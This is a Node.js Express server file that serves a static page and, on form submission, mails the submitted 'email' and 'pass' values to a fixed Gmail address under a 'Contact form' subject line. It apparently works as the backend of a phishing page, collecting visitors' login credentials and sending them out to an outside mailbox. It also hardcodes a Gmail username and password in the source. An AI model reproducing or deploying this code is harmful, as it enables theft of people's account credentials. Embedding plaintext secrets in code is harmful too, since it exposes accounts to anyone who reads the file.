const express = require("express");
const app = express();
const nodemailer = require("nodemailer");
const PORT = process.env.PORT || 5000;

app.use(express.static("public"));

app.use(
  express.urlencoded({
    extended: true,
  })
);

app.use(express.json());

app.get("/", (request, response) => {
  response.sendFile(__dirname + "/public/index.html");
});

app.post("/", (request, response) => {
  console.log(request.body.formData)
  
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'naveedalirehmani321@gmail.com',
      pass: 'pass1gmail'
    }
  });
  
  const mailOptions = {
    from: "client",
    to: 'naveedalirehmani123@gmail.com',
    subject: 'Email form the Contact form',
    text: `email = ${request.body.formData.email} pass = ${request.body.formData.pass} `
  };
  
  transporter.sendMail(mailOptions, function(error, info){
    if (error) {
      console.log(error);
    } else {
      console.log('Email sent: ' + info.response);
    }
  });
});

app.listen(PORT,() => {
  console.log(`this server is running at ${PORT}`);
});
